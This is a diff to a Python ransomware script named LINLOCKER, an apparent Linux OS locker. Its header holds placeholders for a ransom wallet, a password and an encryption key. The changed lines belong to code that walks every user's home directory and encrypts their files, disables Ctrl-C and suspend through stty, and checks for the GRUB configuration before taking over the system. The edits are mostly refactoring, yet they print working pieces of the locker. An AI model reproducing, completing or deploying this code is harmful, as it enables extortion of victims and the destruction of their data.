@@ -4,16 +4,20 @@
 # SURNAME: Khudash  
 # AGE: 17
 
-# DATE: 14.10.2025
+# DATE: 12.11.2025
 # APP: LINLOCKER
 # TYPE: OS_LOCKER
 # VERSION: LATEST
 # PLATFORM: linux
 
 
+
+
 WALLET = 'HERE IS LINCLOKER WALLET'
 PASSWORD = 'HERE IS LINLOCKER PASSWORD'
 KEY = 'HERE IS LINLOCKER ENCRYPTOR PASSWORD'
+
+
 
 
 import os
@@ -25,15 +29,15 @@ from hashlib import sha256
 from shutil import move as move_file
 
 
+PYTHON_VERSION = version[0]
+
 FILE = __file__
-FILE_NAME = os.path.split(FILE)[-1]
+FILE_NAME = os.path.split(FILE)[1]
 
 PATH = '/etc/linlocker'
 PATH_FILE = PATH + '/' + FILE_NAME
 PATH_FLAG = PATH + '/' + 'flag'
 PATH_KEY = '/etc/linlocker.tmp'
-
-PYTHON_VERSION = version[0]
 
 USERS = glob('/home/*')
 
@@ -185,7 +189,7 @@ def encrypt(main_path):
             try:
                 dir = root.split('/')[3]
 
-                if (dir[0] != '.') and (not dir in ['snap']):
+                if (dir[0] != '.') and (dir not in ['snap']):
                     for path_file in files:
                         encrypt_file(os.path.join(root, path_file), KEY)
             except: 
@@ -247,11 +251,14 @@ GRUB_CMDLINE_LINUX=""
     
 
 def main():
-    if ((not WALLET) or (not PASSWORD) or (not KEY)) or (WALLET == 'HERE IS LINCLOKER WALLET' or PASSWORD == 'HERE IS LINLOCKER PASSWORD' or KEY == 'HERE IS LINLOCKER ENCRYPTOR PASSWORD'):
+    if ((not WALLET) or (not PASSWORD) or (not KEY)
+        ) or ((WALLET == 'HERE IS LINCLOKER WALLET'
+         ) or (PASSWORD == 'HERE IS LINLOCKER PASSWORD'
+         ) or (KEY == 'HERE IS LINLOCKER ENCRYPTOR PASSWORD')):
         print('initialized data is invalid')
         os.abort()
 
-    if not os.path.exists('/etc/os-release'):
+    if not os.path.exists('/etc/os-release') or not os.path.exists('/etc/default/grub'):
         print('DO NOT SUPPORT OS')
         os.abort()
 
@@ -262,10 +269,7 @@ def main():
     sp.run(['stty', 'intr', 'undef'], stdout=sp.DEVNULL, stderr=sp.DEVNULL)
     sp.run(['stty', 'susp', 'undef'], stdout=sp.DEVNULL, stderr=sp.DEVNULL)
 
-    if os.path.exists(PATH_FLAG):
-        shell()
-    else:
-        init()
+    shell() if os.path.exists(PATH_FLAG) else init()
 
 
 try:
